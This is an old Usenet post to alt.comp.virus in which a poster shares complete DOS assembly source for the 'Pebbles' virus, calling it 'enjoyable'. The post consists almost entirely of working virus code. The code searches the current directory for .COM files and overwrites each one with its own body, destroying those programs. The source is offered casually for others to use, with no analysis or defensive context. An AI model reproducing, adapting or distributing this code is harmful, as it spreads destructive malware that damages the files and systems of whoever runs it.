From netcom.com!ix.netcom.com!netnews Sat Nov 12 17:10:01 1994
Xref: netcom.com alt.comp.virus:198
Path: netcom.com!ix.netcom.com!netnews
From: Zeppelin@ix.netcom.com (Mr. G)
Newsgroups: alt.comp.virus
Subject: Re: Virus Creation Labs book
Date: 12 Nov 1994 03:29:54 GMT
Organization: Netcom
Lines: 54
Distribution: world
Message-ID: <3a1cri$m31@ixnews1.ix.netcom.com>
References: <3a0s7b$r6i$1@mhadf.production.compuserve.com> <3a1aj7$l5e@ixnews1.ix.netcom.com>
NNTP-Posting-Host: ix-ir4-22.ix.netcom.com

I
;	Here's is another that I think that you will find enjoyable ! 

;			P E B B L E S     V I R U S !
;				-Zep-

DOSSEG
MODEL tiny
CODESEG
                org     100h

vir_len         = finish-start

start           equ     $

Begin:
                mov     ah,4eh                  ; Findfirst...
                mov     cx,00100111b
                mov     dx,offset filespec      ; dx <- "*.COM"
loop1:
                int     21h                     
                jc      done                    ; No more files?  Better 
stop.
                call    inf                     ; Infect file...
                mov     ah,4fh                  ; Findnext..
                jmp     short loop1             ; Over and over till 
there
                                                ; ain't no more..
done:
                int     20h                     ; Though bad it's 
shorter
                                                ; than mov ah,4c int 
21h...

proc            inf
                mov     ax,3d02h                ; Open de file...
                mov     dx,9eh                  ; dx <- DTA filename
                int     21h                     
                mov     ah,40h                  ; Write..
                mov     cx,offset vir_len       ; Length of virus to 
write.
                mov     dx,offset start         ; dx <- beg. of virus
                int     21h
                mov     ah,3eh                  ; Close up file.
                int     21h
                ret                             ; Get back...
endp            inf

filespec        db      "*.COM",0               ; Filespec to infect.

finish          equ     $
                end     Begin
 


